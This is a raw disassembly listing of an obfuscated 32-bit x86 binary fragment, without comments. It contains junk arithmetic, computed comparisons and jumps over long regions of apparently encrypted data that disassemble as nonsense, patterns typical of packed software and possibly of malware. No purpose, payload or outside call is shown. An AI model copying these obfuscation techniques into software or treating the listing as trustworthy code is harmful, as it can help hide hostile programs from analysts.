  409619:	mov    eax,DWORD PTR [ebp-0x28]
  40961c:	adc    ecx,0x6b26
  409622:	mov    ecx,DWORD PTR [ebp-0x24]
  409625:	add    DWORD PTR ds:0x428571,edi
  40962b:	mov    edx,DWORD PTR [ebp-0x20]
  40962e:	cmp    DWORD PTR ds:0x428435,0x0
  409635:	mov    DWORD PTR ds:0x42843d,edi
  40963b:	mov    DWORD PTR ds:0x428405,ecx
  409641:	mov    DWORD PTR ds:0x428445,0x2db2
  40964b:	jmp    0x409715
  409650:	mov    esi,DWORD PTR ds:0x428441
  409656:	mov    DWORD PTR ds:0x4284d9,ebx
  40965c:	cmp    DWORD PTR ds:0x428435,0x0
  409663:	jg     0x409686
  409669:	push   0x3d0d
  40966e:	call   DWORD PTR ds:0x42e000
  409674:	xor    DWORD PTR ds:0x428439,ecx
  40967a:	sbb    DWORD PTR ds:0x428435,edi
  409680:	dec    DWORD PTR ds:0x428349
  409686:	mov    esi,DWORD PTR ds:0x428335
  40968c:	xor    DWORD PTR ds:0x4284dd,esi
  409692:	and    DWORD PTR ds:0x4284e5,ecx
  409698:	dec    esi
  409699:	cmp    DWORD PTR ds:0x4284e9,0x0
  4096a0:	mov    DWORD PTR ds:0x4284f1,0x1a91
  4096aa:	movzx  esi,BYTE PTR ds:0x428341
  4096b1:	mov    esi,0x63fe
  4096b6:	jmp    0x409715
  4096bb:	mov    DWORD PTR ds:0x42842d,0x20e7
  4096c5:	cmp    DWORD PTR ds:0x4284e9,0x0
  4096cc:	jae    0x4096f5
  4096d2:	push   DWORD PTR [ebp-0x20]
  4096d5:	push   0x278f
  4096da:	push   DWORD PTR [ebp-0x1c]
  4096dd:	call   DWORD PTR ds:0x42e004
  4096e3:	or     esi,DWORD PTR ds:0x4284d1
  4096e9:	sbb    esi,DWORD PTR ds:0x4284c5
  4096ef:	and    DWORD PTR ds:0x42832d,edx
  4096f5:	dec    DWORD PTR ds:0x428569
  4096fb:	or     esi,0x67c0
  409701:	add    DWORD PTR ds:0x428415,0x146d
  40970b:	sbb    DWORD PTR ds:0x428565,0xdcf
  409715:	mov    esi,DWORD PTR [ebp-0x1c]
  409718:	add    eax,0x355c
  40971d:	mov    DWORD PTR ds:0x42836d,0x28d
  409727:	adc    ecx,0x819
  40972d:	xor    DWORD PTR ds:0x428331,0x49ee
  409737:	or     eax,edx
  409739:	mov    DWORD PTR ds:0x428365,0x383a
  409743:	mov    edx,DWORD PTR [ebp-0x10]
  409746:	or     ecx,esi
  409748:	sub    DWORD PTR ds:0x428359,0x6778
  409752:	mov    esi,DWORD PTR [ebp-0xc]
  409755:	or     eax,edx
  409757:	movzx  edx,BYTE PTR ds:0x42854d
  40975e:	xor    edx,DWORD PTR ds:0x428465
  409764:	mov    DWORD PTR ds:0x42854d,edx
  40976a:	mov    edx,DWORD PTR [ebp-0x30]
  40976d:	or     ecx,esi
  40976f:	mov    esi,DWORD PTR [ebp-0x2c]
  409772:	or     eax,0xf34
  409777:	neg    DWORD PTR ds:0x428469
  40977d:	or     ecx,0x6c90
  409783:	mov    DWORD PTR ds:0x42845d,0x7584
  40978d:	cmp    edx,eax
  40978f:	mov    DWORD PTR ds:0x428441,0x7ecb
  409799:	jne    0x4097bb
  40979f:	mov    DWORD PTR ds:0x42840d,0x4655
  4097a9:	cmp    esi,ecx
  4097ab:	mov    DWORD PTR ds:0x42840d,0x7ff3
  4097b5:	je     0x40a10f
  4097bb:	xor    esi,esi
  4097bd:	or     esi,DWORD PTR ds:0x42855d
  4097c3:	adc    DWORD PTR ds:0x4284e5,esi
  4097c9:	mov    DWORD PTR [ebp-0x30],0x5ddc
  4097d0:	mov    DWORD PTR [ebp-0x2c],0x7433
  4097d7:	mov    eax,DWORD PTR [ebp-0x30]
  4097da:	mov    ecx,DWORD PTR [ebp-0x2c]
  4097dd:	xor    ecx,0xfffffd1f
  4097e3:	xor    eax,0xffff9fff
  4097e8:	and    ecx,0x6e0
  4097ee:	and    eax,0x6244
  4097f3:	mov    DWORD PTR [ebp-0x10],eax
  4097f6:	mov    DWORD PTR [ebp-0xc],ecx
  4097f9:	mov    DWORD PTR [ebp-0x20],0x4a50
  409800:	mov    DWORD PTR [ebp-0x1c],0x2079
  409807:	mov    DWORD PTR [ebp-0x28],0x792e
  40980e:	mov    DWORD PTR [ebp-0x24],0x10e8
  409815:	mov    DWORD PTR [ebp-0x30],0x22b3
  40981c:	mov    DWORD PTR [ebp-0x2c],0x2293
  409823:	mov    eax,DWORD PTR [ebp-0x30]
  409826:	mov    ecx,DWORD PTR [ebp-0x2c]
  409829:	mov    edx,DWORD PTR [ebp-0x28]
  40982c:	mov    esi,DWORD PTR [ebp-0x24]
  40982f:	add    eax,edx
  409831:	mov    edx,DWORD PTR [ebp-0x20]
  409834:	adc    ecx,esi
  409836:	mov    esi,DWORD PTR [ebp-0x1c]
  409839:	add    eax,0x3e60
  40983e:	adc    ecx,0xd49e
  409844:	xor    eax,0x14ce
  409849:	xor    ecx,0x354f
  40984f:	add    eax,edx
  409851:	mov    edx,DWORD PTR [ebp-0x10]
  409854:	adc    ecx,esi
  409856:	mov    esi,DWORD PTR [ebp-0xc]
  409859:	cmp    edx,eax
  40985b:	jne    0x409869
  409861:	cmp    esi,ecx
  409863:	je     0x40a10f
  409869:	mov    DWORD PTR [ebp-0x28],0x4db
  409870:	mov    DWORD PTR [ebp-0x24],0x233b
  409877:	mov    DWORD PTR [ebp-0x30],0x2c94
  40987e:	push   0x6b33
  409883:	mov    DWORD PTR [ebp-0x2c],0x647f
  40988a:	jmp    0x409b09
  40988f:	and    BYTE PTR [ebx-0x53bd1443],ah
  409895:	sub    al,0xab
  409897:	dec    edi
  409898:	test   al,0xc
  40989a:	xchg   edx,eax
  40989b:	fisttp WORD PTR [ebp+ecx*8-0x41780d70]
  4098a2:	mov    esi,0xbebec279
  4098a7:	nop
  4098a8:	rol    BYTE PTR [edi],0xc4
  4098ab:	imul   esi,DWORD PTR [ebx+edi*1+0x50],0xffffffb3
  4098b0:	ror    BYTE PTR [ecx-0x79fddd3c],cl
  4098b6:	pusha  
  4098b7:	out    0x3e,eax
  4098b9:	sar    BYTE PTR [esi],0x98
  4098bc:	sub    al,0x59
  4098be:	bound  edx,QWORD PTR es:0x326b6d6
  4098c5:	pop    esp
  4098c6:	scas   al,BYTE PTR es:[edi]
  4098c7:	cld    
  4098c8:	dec    BYTE PTR [edx+0x6c395960]
  4098ce:	sub    eax,esi
  4098d0:	daa    
  4098d1:	jl     0x4098f3
  4098d3:	adc    bl,BYTE PTR [bp+si+0x1e]
  4098d7:	sub    BYTE PTR [eax+ecx*1+0x4958d9b6],al
  4098de:	fldenv [edx]
  4098e0:	push   esp
  4098e1:	and    DWORD PTR [edx+0x7e],esi
  4098e4:	adc    DWORD PTR [esi+esi*1],ebx
  4098e7:	repnz loopne 0x409908
  4098ea:	xlat   BYTE PTR ds:[ebx]
  4098eb:	js     0x409969
  4098ed:	nop
  4098ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098ef:	fidiv  WORD PTR [edi-0x1ef68f83]
  4098f5:	jecxz  0x40994a
  4098f7:	scas   al,BYTE PTR es:[edi]
  4098f8:	outs   dx,BYTE PTR ds:[esi]
  4098f9:	pop    ebx
  4098fa:	sub    DWORD PTR [bp+di-0x6d4e],0xffffffd3
  409900:	daa    
  409901:	mov    gs,WORD PTR [edx+0x736f4d17]
  409907:	sub    BYTE PTR [eax+0x8adb132],ch
  40990d:	pop    ebp
  40990e:	xor    dh,bh
  409910:	add    dh,BYTE PTR [esi+0x37b4f025]
  409916:	les    esp,FWORD PTR [ebx+0x22]
  409919:	pop    esp
  40991a:	xchg   esi,eax
  40991b:	mov    ecx,0x8747f89d
  409920:	dec    ebp
  409921:	setb   al
  409924:	sub    al,0x78
  409926:	mov    cs,esi
  409928:	retf   
  409929:	nop
  40992a:	jne    0x40999f
  40992c:	stos   BYTE PTR es:[edi],al
  40992d:	xchg   ebp,eax
  40992e:	lea    ecx,[esi]
  409930:	lahf   
  409931:	adc    eax,0xa6409803
  409936:	and    DWORD PTR [ecx-0x263228d7],edx
  40993c:	mov    DWORD PTR [ebp-0x79],ebp
  40993f:	sub    al,0xef
  409941:	ret    
  409942:	loop   0x40996a
  409944:	sub    ebp,esp
  409946:	outs   dx,DWORD PTR ds:[esi]
  409947:	(bad)  
  409948:	adc    eax,0xc5dfa4db
  40994d:	sbb    BYTE PTR [edi-0x58],ah
  409950:	cmp    al,0x89
  409952:	sahf   
  409953:	push   eax
  409954:	popf   
  409955:	adc    BYTE PTR [eax+ebx*8],ch
  409958:	xor    DWORD PTR [esp+ebp*2-0xa],ecx
  40995c:	call   0xa8387a56
  409961:	add    BYTE PTR [edx-0x1b],al
  409964:	repnz mov ebx,0xcbf1328e
  40996a:	fnstcw WORD PTR [edi]
  40996c:	jnp    0x4099c3
  40996e:	and    DWORD PTR [edi+eax*8-0x2b3b763c],edx
  409975:	mov    edi,0xfa94d30f
  40997a:	call   0x37d:0xcbd23426
  409981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409982:	lahf   
  409983:	scas   eax,DWORD PTR es:[edi]
  409984:	and    DWORD PTR [ebx+edx*1],esp
  409987:	aad    0xde
  409989:	cmp    cl,BYTE PTR [esi-0x656b3a30]
  40998f:	leave  
  409990:	and    al,0x8c
  409992:	les    ebp,FWORD PTR [ebx+0x35]
  409995:	leave  
  409996:	sbb    BYTE PTR [ecx-0x7bd0bd71],bl
  40999c:	in     al,0xb4
  40999e:	sbb    esp,DWORD PTR [ebx]
  4099a0:	in     eax,dx
  4099a1:	dec    esi
  4099a2:	std    
  4099a3:	pop    esi
  4099a4:	xor    DWORD PTR [eax+ecx*2],edi
  4099a7:	xchg   esp,eax
  4099a8:	jmp    0x3182f9a2
  4099ad:	jle    0x4099d0
  4099af:	xor    edx,DWORD PTR [ebx]
  4099b1:	ins    BYTE PTR es:[edi],dx
  4099b2:	outs   dx,BYTE PTR ds:[esi]
  4099b3:	leave  
  4099b4:	out    dx,eax
  4099b5:	call   0xaa3af836
  4099ba:	sub    al,0x82
  4099bc:	into   
  4099bd:	push   eax
  4099be:	pusha  
  4099bf:	outs   dx,DWORD PTR ds:[esi]
  4099c0:	idiv   edx
  4099c2:	not    BYTE PTR [edx]
  4099c4:	das    
  4099c5:	dec    ebp
  4099c6:	int    0xa0
  4099c8:	jno    0x409a2c
  4099ca:	shl    edx,1
  4099cc:	adc    DWORD PTR [ebx-0x16],edi
  4099cf:	bound  esi,QWORD PTR [esi+0x7a]
  4099d2:	sub    BYTE PTR [edi],cl
  4099d4:	les    eax,FWORD PTR [edi-0x2e5d005]
  4099da:	retf   
  4099db:	jne    0x4099a0
  4099dd:	cld    
  4099de:	push   ds
  4099df:	out    dx,eax
  4099e0:	add    al,0xad
  4099e2:	popf   
  4099e3:	and    DWORD PTR [edx-0x78],ebx
  4099e6:	(bad)  
  4099e7:	repz jp 0x409a38
  4099ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099eb:	push   ds
  4099ec:	test   DWORD PTR [eax+esi*8+0x796a6e20],0xe4169438
  4099f7:	rcr    BYTE PTR [edx-0x3d],1
  4099fa:	imul   esp,DWORD PTR [edi-0x49],0xffffff86
  4099fe:	pop    ecx
  4099ff:	jl     0x409a80
  409a01:	pop    ebx
  409a02:	or     eax,0xf16d93a
  409a07:	nop
  409a08:	outs   dx,BYTE PTR ds:[esi]
  409a09:	rol    BYTE PTR [eax-0x1395bfcc],0xd5
  409a10:	pop    es
  409a11:	or     ch,BYTE PTR ds:0xf7b2882b
  409a17:	dec    edi
  409a18:	or     al,0x6b
  409a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a1c:	shl    BYTE PTR [edi-0x7ffae15b],cl
  409a22:	dec    ecx
  409a23:	pop    edx
  409a24:	or     ch,BYTE PTR ds:0x6db3509a
  409a2a:	add    eax,0x86c8999e
  409a2f:	cmc    
  409a30:	mov    ah,0x39
  409a32:	xor    DWORD PTR [edi],esp
  409a34:	sbb    esp,eax
  409a36:	loopne 0x409a92
  409a38:	inc    edi
  409a39:	stos   BYTE PTR es:[edi],al
  409a3a:	cmp    ah,0x4b
  409a3d:	ja     0x409a47
  409a3f:	inc    edx
  409a40:	jo     0x409a39
  409a42:	hlt    
  409a43:	repnz dec eax
  409a45:	jmp    0x3ec0a91f
  409a4a:	add    esi,DWORD PTR [edx-0x14f26436]
  409a50:	shl    BYTE PTR [edx+0xee08abb],1
  409a56:	mov    eax,ds:0xc7a510bd
  409a5b:	aad    0xb9
  409a5d:	mov    esp,0xce7dc0d6
  409a62:	test   BYTE PTR [ebp+0xc1cbd69],dh
  409a68:	imul   edi,ebp,0x47
  409a6b:	add    ebp,DWORD PTR [bx+si]
  409a6e:	xchg   DWORD PTR [ecx-0x5e102c0e],esi
  409a74:	lds    esp,FWORD PTR ds:0x50e726aa
  409a7a:	mov    ch,0xa5
  409a7c:	es xchg ecx,eax
  409a7e:	call   FWORD PTR ds:0x63b04b70
  409a84:	pop    edi
  409a85:	or     eax,0x80a8a4d0
  409a8a:	(bad)  
  409a8c:	into   
  409a8d:	xor    al,BYTE PTR [ecx+ecx*1-0x31b9dad8]
  409a94:	or     al,0x61
  409a96:	(bad)  
  409a97:	in     eax,dx
  409a98:	and    BYTE PTR [ebp-0x514e2238],bl
  409a9e:	in     al,dx
  409a9f:	fisubr DWORD PTR [edx-0x342cb0f5]
  409aa5:	out    0xc4,eax
  409aa7:	jmp    0x409adb
  409aa9:	je     0x409ae6
  409aab:	xor    eax,0x4cd7fa22
  409ab0:	or     bh,BYTE PTR [ebx+ebx*1-0x8024d0e]
  409ab7:	addr16 xchg edx,eax
  409ab9:	inc    esp
  409aba:	test   al,0xb5
  409abc:	(bad)  
  409abd:	pop    ss
  409abe:	pop    ds
  409abf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ac2:	jecxz  0x409b04
  409ac4:	neg    ch
  409ac6:	mov    edi,DWORD PTR [ecx]
  409ac8:	jg     0x409abd
  409aca:	adc    BYTE PTR [ebp-0x7412bbf7],bl
  409ad0:	pop    eax
  409ad1:	mov    ?,WORD PTR [eax+0x436ed861]
  409ad7:	mov    WORD PTR [esi-0x5e6c5b01],ds
  409add:	xchg   edx,eax
  409ade:	mov    edi,0x6b4053b5
  409ae3:	mov    cl,0xc5
  409ae5:	cld    
  409ae6:	callw  0xdc70
  409aea:	fld    TBYTE PTR [edx-0x60]
  409aed:	pop    ebp
  409aee:	in     al,0x50
  409af0:	mov    DWORD PTR [esi],ebp
  409af2:	add    esi,DWORD PTR [ebx-0x8]
  409af5:	sub    dl,ah
  409af7:	jge    0x409b2c
  409af9:	inc    ecx
  409afa:	jl     0x409ad0
  409afc:	add    al,0x8b
  409afe:	push   0xffffffac
  409b00:	fidivr WORD PTR [eax-0x24]
  409b03:	dec    edi
  409b04:	push   ss
  409b05:	test   DWORD PTR [ebx-0x17],edi
  409b08:	int3   
  409b09:	mov    eax,DWORD PTR [ebp-0x30]
  409b0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  409b0f:	push   0x7c8f
  409b14:	push   ecx
  409b15:	push   eax
  409b16:	call   0x41594e
  409b1b:	mov    ecx,DWORD PTR [ebp-0x28]
  409b1e:	mov    esi,DWORD PTR [ebp-0x24]
  409b21:	push   0x4e1a18a
  409b26:	push   0x283cdcc
  409b2b:	and    edx,esi
  409b2d:	and    eax,ecx
  409b2f:	push   edx
  409b30:	push   eax
  409b31:	call   0x41594e
  409b36:	xor    eax,0x687b
  409b3b:	xor    edx,0x18d4
  409b41:	mov    DWORD PTR [ebp-0x30],eax
  409b44:	mov    DWORD PTR [ebp-0x2c],edx
  409b47:	mov    eax,ds:0x42291c
  409b4c:	cmp    eax,0x7cd80819
  409b51:	jne    0x40a10f
  409b57:	mov    eax,DWORD PTR [ebp-0x18]
  409b5a:	mov    ecx,DWORD PTR [ebp-0x14]
  409b5d:	mov    edx,DWORD PTR [ebp-0x18]
  409b60:	mov    esi,DWORD PTR [ebp-0x14]
  409b63:	shrd   eax,ecx,0x2
  409b67:	shl    edx,0x1e
  409b6a:	mov    edx,DWORD PTR ds:0x422708
  409b70:	mov    edx,DWORD PTR [edx+0x1a8]
  409b76:	shr    ecx,0x2
  409b79:	xor    esi,esi
  409b7b:	mov    ecx,0x32de6d5d
  409b80:	xor    eax,ecx
  409b82:	or     eax,esi
  409b84:	mov    DWORD PTR [edx],eax
  409b86:	mov    eax,DWORD PTR [ebp-0x18]
  409b89:	mov    edx,DWORD PTR [ebp-0x14]
  409b8c:	shrd   eax,edx,0x2
  409b90:	shr    edx,0x2
  409b93:	mov    edx,DWORD PTR [ebp-0x18]
  409b96:	mov    esi,DWORD PTR [ebp-0x14]
  409b99:	xor    eax,ecx
  409b9b:	xor    esi,esi
  409b9d:	or     eax,esi
  409b9f:	mov    ds:0x42291c,eax
  409ba4:	mov    BYTE PTR [ebp-0x2],0x4f
  409ba8:	mov    BYTE PTR [ebp-0x1],0xf9
  409bac:	movzx  eax,BYTE PTR [ebp-0x1]
  409bb0:	shl    edx,0x1e
  409bb3:	mov    dl,BYTE PTR [ebp-0x2]
  409bb6:	xor    al,0x42
  409bb8:	add    al,dl
  409bba:	jmp    0x409e39
  409bbf:	mov    ah,0x7e
  409bc1:	mov    ch,0xd4
  409bc3:	mov    ebx,0x3e9ebcfc
  409bc8:	mov    cl,0x9a
  409bca:	jecxz  0x409c1b
  409bcc:	aam    0x66
  409bce:	shr    DWORD PTR [esi+0x79bebe8b],1
  409bd4:	ret    0xbebe
  409bd7:	int    0x22
  409bd9:	imul   ebx,ecx,0x854538c
  409bdf:	jl     0x409bb6
  409be1:	sbb    ecx,DWORD PTR [ecx]
  409be3:	rcr    cl,cl
  409be5:	dec    ebp
  409be6:	retf   0x25ab
  409be9:	jne    0x409be0
  409beb:	push   cs
  409bec:	imul   ebx,DWORD PTR [eax],0x25
  409bef:	add    al,0x33
  409bf1:	jns    0x409b9a
  409bf3:	popfw  
  409bf5:	mov    edx,DWORD PTR [edx+0x576f655]
  409bfb:	in     al,dx
  409bfc:	(bad)  
  409bfe:	lea    eax,[ebx+0x214eabb]
  409c04:	(bad)  
  409c05:	lahf   
  409c06:	lods   eax,DWORD PTR ds:[esi]
  409c07:	dec    ecx
  409c08:	mov    BYTE PTR [ecx],ah
  409c0a:	push   esi
  409c0b:	imul   edx,DWORD PTR [edx+0xa],0xab102995
  409c12:	ret    0xd5eb
  409c15:	les    ebx,FWORD PTR [ecx+0x22a5dc47]
  409c1b:	cmp    eax,0xf2ca4135
  409c20:	cmp    DWORD PTR [ecx+0x44],esi
  409c23:	fs mov dh,0xac
  409c26:	and    eax,eax
  409c28:	xchg   ebx,eax
  409c29:	in     eax,0x3e
  409c2b:	xchg   ecx,eax
  409c2c:	(bad)  
  409c2d:	inc    ebx
  409c2e:	mov    ah,0x7e
  409c30:	xchg   edx,eax
  409c31:	cmp    BYTE PTR [ecx+0x4e],al
  409c34:	push   ecx
  409c35:	jnp    0x409c65
  409c37:	mov    bh,0x2c
  409c39:	(bad)  
  409c3a:	add    eax,0x8107c2a9
  409c3f:	jne    0x409c85
  409c41:	ds cld 
  409c43:	inc    ebp
  409c44:	jns    0x409c09
  409c46:	vcmppd ymm4,ymm5,YMMWORD PTR [esi],0xd2
  409c4b:	loopne 0x409c76
  409c4d:	retf   
  409c4e:	push   edi
  409c4f:	aam    0x15
  409c51:	adc    BYTE PTR [ebx+0x1],dh
  409c54:	adc    eax,0xc7a32701
  409c59:	data16 ja 0x409c2c
  409c5c:	popa   
  409c5d:	lods   al,BYTE PTR ds:[esi]
  409c5e:	lods   eax,DWORD PTR ds:[esi]
  409c5f:	fsub   DWORD PTR [eax]
  409c61:	push   esi
  409c62:	out    dx,eax
  409c63:	xor    esp,ecx
  409c65:	inc    ebp
  409c66:	mul    BYTE PTR [eax]
  409c68:	jb     0x409c2f
  409c6a:	ins    BYTE PTR es:[edi],dx
  409c6b:	and    BYTE PTR [ebx+0x70],bh
  409c6e:	xchg   BYTE PTR [ebx-0xb],ch
  409c71:	dec    edx
  409c72:	inc    edx
  409c73:	jmp    0x46f9:0x6897d57a
  409c7a:	aam    0x9a
  409c7c:	pop    edx
  409c7d:	cmp    esp,edi
  409c7f:	ja     0x409c60
  409c81:	lea    edx,[edi-0x57d4a9b9]
  409c87:	cmp    edx,ecx
  409c89:	push   0xffffffa8
  409c8b:	mov    ah,0xdb
  409c8d:	(bad)  [ebx+edx*4]
  409c90:	sbb    al,BYTE PTR [edi]
  409c92:	pop    ebp
  409c93:	shl    al,1
  409c95:	push   0xfffffff6
  409c97:	mov    ah,0x6b
  409c99:	add    ah,bh
  409c9b:	(bad)  
  409c9c:	pop    ecx
  409c9d:	popf   
  409c9e:	scas   al,BYTE PTR es:[edi]
  409c9f:	mov    al,ds:0x39ac433d
  409ca4:	mov    eax,edi
  409ca6:	mov    bh,0xdb
  409ca8:	out    0xa2,eax
  409caa:	mov    bh,0x62
  409cac:	repz dec ebp
  409cae:	js     0x409d2f
  409cb0:	mov    dl,0xd2
  409cb2:	(bad)  
  409cb3:	or     DWORD PTR [edx],0x48
  409cb6:	in     al,0xb4
  409cb8:	jge    0x409d31
  409cba:	jle    0x409cd3
  409cbc:	mov    al,0xef
  409cbe:	push   0x6
  409cc0:	(bad)  
  409cc1:	hlt    
  409cc2:	cmp    al,0xe3
  409cc4:	out    dx,al
  409cc5:	aad    0x9f
  409cc7:	pushw  0xc70b
  409ccb:	or     dh,ah
  409ccd:	in     al,dx
  409cce:	scas   al,BYTE PTR es:[edi]
  409ccf:	push   esp
  409cd0:	test   eax,0x7ea85868
  409cd5:	inc    edx
  409cd6:	fmul   st,st(5)
  409cd8:	pop    edx
  409cd9:	test   al,0x73
  409cdb:	ins    DWORD PTR es:[edi],dx
  409cdc:	jns    0x409c9b
  409cde:	mov    DWORD PTR [esi-0x4322b621],edx
  409ce4:	mov    al,ah
  409ce6:	retf   0xef63
  409ce9:	xchg   esp,eax
  409cea:	sar    DWORD PTR [edx],0x8b
  409ced:	and    eax,0xdad96f2f
  409cf2:	jno    0x409cda
  409cf4:	iret   
  409cf5:	shl    BYTE PTR [ebx],0x2
  409cf8:	mov    ds:0x1abf029d,eax
  409cfd:	adc    eax,0x4385b491
  409d02:	in     al,dx
  409d03:	adc    eax,0xfec023dd
  409d08:	sahf   
  409d09:	inc    esi
  409d0a:	nop
  409d0b:	enter  0x18dd,0x65
  409d0f:	pop    ss
  409d10:	adc    eax,DWORD PTR [eax]
  409d12:	adc    cl,dl
  409d14:	jb     0x1a36a5da
  409d1a:	loop   0x409d3f
  409d1c:	jb     0x409cf7
  409d1e:	shl    dl,1
  409d20:	(bad)  
  409d21:	in     al,0xcc
  409d23:	int3   
  409d24:	ror    BYTE PTR [ebp+0x788362f2],0x68
  409d2b:	mov    esi,0x30aeb9a6
  409d30:	add    BYTE PTR [ebx],ah
  409d32:	pop    edx
  409d33:	popa   
  409d34:	sahf   
  409d35:	retf   
  409d36:	xor    eax,0x93c99cdc
  409d3b:	or     dl,ah
  409d3d:	test   BYTE PTR cs:[edi+0x16],dh
  409d41:	push   edx
  409d42:	sub    al,0xe1
  409d44:	push   ecx
  409d45:	pushf  
  409d46:	add    DWORD PTR [ebx+eiz*2-0x262c6506],ebp
  409d4d:	pop    ds
  409d4e:	jecxz  0x409cd9
  409d50:	or     esi,esp
  409d52:	cdq    
  409d53:	jmp    0xd2816a6b
  409d58:	jne    0x409d66
  409d5a:	mov    esp,0xc0df9099
  409d5f:	aam    0xa9
  409d61:	xor    eax,0xf8b1a632
  409d66:	and    esp,DWORD PTR [ebx]
  409d68:	cld    
  409d69:	lea    ebp,[eax+edx*8+0x3c]
  409d6d:	je     0x409db8
  409d6f:	adc    eax,DWORD PTR [ebx]
  409d71:	jb     0x409d2a
  409d73:	mov    al,ds:0x4180f8d0
  409d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d79:	stc    
  409d7a:	push   cs
  409d7b:	mov    ss,WORD PTR [esi+0x1182dce0]
  409d81:	xor    ecx,edx
  409d83:	sti    
  409d84:	test   al,0x2
  409d86:	xchg   edx,eax
  409d87:	mov    ebx,0xa9d5a8e4
  409d8c:	loop   0x409d70
  409d8e:	pop    esp
  409d8f:	cs gs into 
  409d92:	rol    BYTE PTR [eax+0x28],cl
  409d95:	mov    esp,0x81982a55
  409d9a:	pop    es
  409d9b:	jle    0x409dcf
  409d9d:	fs inc esi
  409d9f:	out    dx,eax
  409da0:	and    BYTE PTR [esp+eiz*4+0x62],dh
  409da4:	jle    0x409da2
  409da6:	lods   al,BYTE PTR ds:[esi]
  409da7:	stos   DWORD PTR es:[edi],eax
  409da8:	push   0xffffffc0
  409daa:	mov    ah,0xcf
  409dac:	add    DWORD PTR [esi-0x77],0x21c3c392
  409db3:	mov    ebx,0x8641591f
  409db8:	hlt    
  409db9:	sahf   
  409dba:	mov    eax,DWORD PTR [esi+0x25]
  409dbd:	ins    DWORD PTR es:[edi],dx
  409dbe:	cli    
  409dbf:	jl     0x409e37
  409dc1:	jno    0x409dea
  409dc3:	inc    ebp
  409dc4:	jns    0x409e3a
  409dc6:	retf   0xe17
  409dc9:	add    ebp,DWORD PTR [edx+0x78f673da]
  409dcf:	cmp    BYTE PTR [eax-0x6c],cl
  409dd2:	lods   al,BYTE PTR ds:[esi]
  409dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dd4:	lods   eax,DWORD PTR ds:[esi]
  409dd5:	xchg   ebp,eax
  409dd6:	enter  0x802b,0xca
  409dda:	sub    eax,0xebc0a10f
  409ddf:	scas   eax,DWORD PTR es:[edi]
  409de0:	xor    eax,DWORD PTR gs:[ecx+0x34]
  409de4:	out    dx,eax
  409de5:	ret    
  409de6:	mov    dh,0xe7
  409de8:	rcl    esi,1
  409dea:	and    ebp,ecx
  409dec:	inc    ebp
  409ded:	and    sp,WORD PTR [edx+0x9dbd5dd]
  409df4:	or     DWORD PTR [eax+0x17],ecx
  409df7:	mov    ecx,0x6762ab60
  409dfc:	jmp    0x409d98
  409dfe:	adc    DWORD PTR [edi],ecx
  409e00:	ror    BYTE PTR [edi],1
  409e02:	fucom  st(1)
  409e04:	mov    dl,al
  409e06:	dec    ecx
  409e07:	in     eax,0xa1
  409e09:	jo     0x409e79
  409e0b:	and    eax,0x2bef65f8
  409e10:	mov    edi,0x71ec8a00
  409e15:	ins    BYTE PTR es:[edi],dx
  409e16:	or     edi,DWORD PTR ds:0x6f2b
  409e1b:	xchg   DWORD PTR [esi+0x57],edi
  409e1e:	mov    edx,es
  409e20:	repz dec esp
  409e22:	mov    ecx,DWORD PTR [esi-0x62]
  409e25:	or     DWORD PTR [eax],esi
  409e27:	sti    
  409e28:	and    al,bh
  409e2a:	aad    0x76
  409e2c:	xor    DWORD PTR [ecx+eax*2-0x55baa816],ebp
  409e33:	ja     0x409df3
  409e35:	ins    BYTE PTR es:[edi],dx
  409e36:	pusha  
  409e37:	in     al,0xcd
  409e39:	push   0x6
  409e3b:	add    eax,0xfa
  409e40:	mov    BYTE PTR [ebp-0x4],al
  409e43:	mov    BYTE PTR [ebp-0x3],0x67
  409e47:	pop    eax
  409e48:	mov    BYTE PTR [ebp-0x1],al
  409e4b:	mov    BYTE PTR [ebp-0x2],0x3
  409e4f:	mov    dl,BYTE PTR [ebp-0x2]
  409e52:	movzx  esi,dl
  409e55:	cdq    
  409e56:	idiv   esi
  409e58:	mov    dl,BYTE PTR [ebp-0x1]
  409e5b:	add    al,dl
  409e5d:	mov    dl,BYTE PTR [ebp-0x3]
  409e60:	or     al,dl
  409e62:	mov    dl,BYTE PTR [ebp-0x4]
  409e65:	add    al,0x3a
  409e67:	cmp    dl,al
  409e69:	jae    0x40a10f
  409e6f:	mov    eax,DWORD PTR [ebp-0x18]
  409e72:	jmp    0x40a0f1
  409e77:	popa   
  409e78:	nop
  409e79:	popf   
  409e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e7b:	mov    ah,0xb8
  409e7d:	imul   ebx,DWORD PTR [eax+edi*1-0x435b79d4],0x6c
  409e85:	jbe    0x409e19
  409e87:	imul   edx,DWORD PTR [ecx-0x3d864142],0x3e5fbebe
  409e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e92:	(bad)  
  409e94:	jecxz  0x409e94
  409e96:	loop   0x409f12
  409e98:	cmp    eax,0x57b7243d
  409e9d:	mov    esp,esi
  409e9f:	inc    ebx
  409ea0:	pop    edi
  409ea1:	cwde   
  409ea2:	arpl   WORD PTR [ecx],ax
  409ea4:	pop    ebx
  409ea5:	jmp    0xc592:0x5ab6a7ce
  409eac:	pop    edx
  409ead:	inc    ebp
  409eae:	aaa    
  409eaf:	and    BYTE PTR [ecx-0x1e],bl
  409eb2:	aad    0xe6
  409eb4:	aam    0x50
  409eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409eb7:	mov    BYTE PTR [edx+0x27],al
  409eba:	cmp    al,0x6a
  409ebc:	sbb    cl,BYTE PTR [eax-0x7e65a939]
  409ec2:	xchg   DWORD PTR [esi],ebx
  409ec4:	mov    ebp,0x24298036
  409ec9:	cmp    eax,0x676125b6
  409ece:	pop    ebx
  409ecf:	push   0xd8d35015
  409ed4:	popf   
  409ed5:	mov    ebp,0x3cc92540
  409eda:	mov    edi,0xbe2690da
